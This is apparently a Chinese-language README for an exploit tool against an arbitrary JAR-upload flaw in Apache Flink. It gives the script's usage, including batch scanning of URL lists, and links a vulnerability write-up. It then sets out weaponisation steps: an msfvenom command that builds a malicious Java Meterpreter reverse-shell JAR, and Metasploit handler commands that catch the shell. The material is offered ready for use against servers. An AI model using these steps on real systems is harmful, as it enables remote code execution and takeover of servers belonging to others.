# Apache Flink任意文件上传-exploit
```text
Usage: python exp.py -u [url] -j [jar] -c [class]/python exp.py -f [url] -j [jar] -c [class]

Options:
  -h, --help    show this help message and exit
  -u URL        单个url测试
  -j JAR        设置恶意jar
  -c JAR_CLASS  jar包里的jar_class
  -f FILE       批量检测
```
漏洞详情：
[Apache Flink任意jar文件上传](https://mp.weixin.qq.com/s?__biz=MzU3NzMxNDgwMA==&mid=2247483881&idx=1&sn=c9b12e7224b7da202d63dc61a212ab6e&chksm=fd07cb76ca7042605f376e007ba1a0ecb8337385da897d7a1cc50badda05459c68ae4de19957&mpshare=1&scene=23&srcid=&sharer_sharetime=1573607643380&sharer_shareid=a4bd184716a047c74e3a7094c5ad77c1#rd)

# 测试结果
![](https://s2.ax1x.com/2019/11/13/MGct8U.png)

![](https://s2.ax1x.com/2019/11/13/MGcOMQ.png)

# 利用方法
```
msfvenom -p java/meterpreter/reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f jar > fuck.jar
```
监听：  
```text
use exploit/multi/handler  
set PAYLOAD java/meterpreter/reverse_tcp  
set LHOST <LHOST>  
set LPORT <LPORT>  
run -j
```

